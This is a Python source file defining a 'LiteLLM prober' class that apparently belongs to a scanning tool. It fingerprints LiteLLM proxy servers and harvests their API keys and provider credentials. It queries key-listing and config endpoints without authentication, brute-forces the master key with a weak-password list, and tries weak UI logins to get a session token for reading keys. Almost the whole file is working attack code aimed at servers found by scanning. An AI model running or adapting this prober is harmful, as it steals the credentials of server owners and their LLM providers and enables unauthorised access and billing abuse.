"""LiteLLM prober — key list + config dump.

LiteLLM proxy exposes:
  - GET /health → health check (confirms it's LiteLLM)
  - GET /key/list → list all API keys (requires master_key as auth)
  - GET /v1/models → model list (sometimes unauthenticated)
  - GET /config/list → full proxy config with provider API keys (needs admin)

Weak-password: LiteLLM ships with admin user, password = master_key.
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import WEAK_CREDENTIALS, Prober

log = logging.getLogger(__name__)


class LiteLLMProber(Prober):
    product_name = "litellm"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "litellm" in blob or "x-litellm" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []

        # 1. Unauthenticated endpoints
        for path in ("/v1/models", "/health", "/key/list", "/config/list"):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"litellm_unauth_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

        # 2. Try weak passwords as master_key in Authorization header
        # LiteLLM uses the master key as both admin password and API auth.
        for _, password in WEAK_CREDENTIALS:
            for path in ("/key/list", "/config/list"):
                resp = await self._get(
                    self._url(hit, path),
                    headers={"Authorization": f"Bearer {password}"},
                )
                found = self._extract_from_response(resp, hit, f"litellm_weak_{path.strip('/').replace('/', '_')}")
                if found:
                    creds.extend(found)
                    break  # this password works, no need to retry same path

        # 3. SSO/UI login → get session token → read keys
        token = await self._try_ui_login(hit)
        if token:
            for path in ("/key/list", "/config/list"):
                resp = await self._get(
                    self._url(hit, path),
                    headers={"Authorization": f"Bearer {token}"},
                )
                found = self._extract_from_response(resp, hit, f"litellm_authed_{path.strip('/').replace('/', '_')}")
                creds.extend(found)

        return creds

    async def _try_ui_login(self, hit: dict[str, Any]) -> str:
        url = self._url(hit, "/sso/key/generate")
        if not url:
            return ""
        for username, password in WEAK_CREDENTIALS:
            resp = await self._post(url, json={"username": username, "password": f"litellm_{password}"})
            if resp is None or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except ValueError:
                continue
            key = data.get("key") or data.get("token") or data.get("api_key") or ""
            if key:
                return key
        return ""
